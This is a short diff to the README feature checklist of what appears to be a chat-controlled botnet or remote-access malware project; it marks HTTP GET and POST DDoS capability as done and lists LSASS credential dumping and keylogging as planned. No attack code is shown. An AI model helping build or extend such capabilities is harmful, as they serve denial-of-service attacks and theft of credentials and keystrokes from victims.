@@ -51,7 +51,7 @@ Run `clean` in any channel to organize bots into their respective categories.
 # WIP (Work in Progress)
 
 - [x] Use windows syscalls
-- [ ] DDOS capability
+- [x] DDOS capability (GET and POST)
 - [ ] Dumping LSASS
 - [ ] Keylogging
 
